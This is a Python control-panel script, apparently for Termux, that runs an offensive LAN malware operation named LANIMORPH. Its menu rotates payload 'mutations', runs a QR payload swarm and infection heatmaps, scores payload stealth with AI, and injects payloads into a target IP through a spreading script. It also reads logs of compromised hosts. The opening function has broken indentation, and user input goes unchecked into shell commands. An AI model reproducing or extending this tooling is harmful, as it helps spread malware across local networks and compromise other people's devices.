def get_local_ip():

    import socket
import subprocess

    try:

        local_ip = socket.gethostbyname(socket.gethostname())

        if local_ip.startswith("127."):

            import subprocess

            result = subprocess.check_output("ip route get 192.168.1.44 | awk '{print $7}'", shell=True).decode().strip()

            if result:

                local_ip = result

    except Exception:

        local_ip = "unknown"

    return local_ip

#!/usr/bin/env python3
import os
import time
import subprocess
from datetime import datetime

def get_current_mutation():
    path = "/data/data/com.termux/files/usr/tmp/vault_drop.txt"
    if os.path.exists(path):
        try:
            with open(path) as f:
                for line in f:
                    if line.strip(): return line.strip()
        except: pass
    return "(none)"

def get_last_injection():
    log = os.path.expanduser("~/LANIMORPH/chain/inject_silent.log")
    if not os.path.exists(log): return "(none)"
    lines = open(log).readlines()
    for line in reversed(lines):
        if "Host compromised by" in line:
            return line.strip()
    return "(none)"

def show_stats():
    print("=" * 60)
    print("🧠  LANIMORPH :: LIVE OPERATION DASHBOARD")
    print("=" * 60)
    print(f"[+] Local IP            : {get_local_ip()}")
    print(f"[+] Current Mutation    : {get_current_mutation()}")
    print(f"[+] Last Injection      : {get_last_injection()}")
    print(f"[+] Time                : {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 60)

def menu():
    while True:
        os.system("clear")
        show_stats()
        print("Choose an option:\n")
        print(" [1] Rotate mutation vault")
        print(" [2] QR payload swarm (show in terminal)")
        print(" [3] Run LAN heatmap")
        print(" [4] Open stealth flyer")
        print(" [5] Replay infection chain")
        print(" [6] Score payload stealth (AI)")
        print(" [7] Inject payload to IP")
        print(" [0] Exit\n")
        choice = input(">> ")

        if choice == "1":
            os.system("bash ~/LANIMORPH/chain/lan_mutation_vault_rotator.sh")
        elif choice == "2":
            os.system("python3 ~/LANIMORPH/chain/qr_payload_swarm.py")
        elif choice == "3":
            os.system("python3 ~/LANIMORPH/chain/lan_heatmap_draw.py && termux-open ~/LANIMORPH/chain/lan_infection_heatmap.txt")
        elif choice == "4":
            os.system("bash ~/LANIMORPH/chain/lan_flyer_trigger.sh")
        elif choice == "5":
            os.system("python3 ~/LANIMORPH/chain/lan_meshmap_draw.py && termux-open ~/LANIMORPH/chain/replays/lan_subnet_meshmap.txt")
        elif choice == "6":
            path = input("Enter payload path: ").strip()
            os.system(f"bash ~/LANIMORPH/chain/lan_stealth_scorer.sh {path}")
        elif choice == "7":
            target = input("Enter target IP: ").strip()
            os.system(f"python3 ~/lan_spread_auto.py {target}")
        elif choice == "0":
            print("[*] Exiting...")
            time.sleep(1)
            break
        else:
            print("[!] Invalid option")
            time.sleep(1)

if __name__ == "__main__":
    menu()
